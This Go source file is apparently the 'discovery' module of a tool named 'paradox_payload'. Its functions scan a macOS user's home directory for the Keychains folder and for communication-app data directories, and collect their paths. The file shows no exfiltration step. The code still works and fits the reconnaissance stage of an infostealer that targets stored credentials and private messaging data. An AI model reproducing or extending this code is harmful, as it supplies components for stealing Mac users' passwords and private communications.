package discovery

import (
	"fmt"
	"os"
	"path/filepath"

	"paradox_payload/static"
)

func CheckKeychainDirectories(homeDir string) ([]string, error) {
	keychainDir := filepath.Join(homeDir, "Library", "Keychains")
	foundDirs := []string{}

	if info, err := os.Stat(keychainDir); err == nil && info.IsDir() {
		foundDirs = append(foundDirs, keychainDir)
	} else if !os.IsNotExist(err) {
		fmt.Printf("Error checking keychain directory %s: %v\n", keychainDir, err)
	}
	return foundDirs, nil
}

func CheckCommunicationAppDirectories(homeDir string) ([]string, error) {
	foundDirs := []string{}
	appSupportDir := filepath.Join(homeDir, "Library", "Application Support")

	for appName, relPath := range static.CommAppDefinitions {
		path := filepath.Join(appSupportDir, relPath)
		if info, err := os.Stat(path); err == nil && info.IsDir() {
			foundDirs = append(foundDirs, path)
		} else if !os.IsNotExist(err) {
			fmt.Printf("Error checking %s directory %s: %v\n", appName, path, err)
		}
	}
	return foundDirs, nil
}
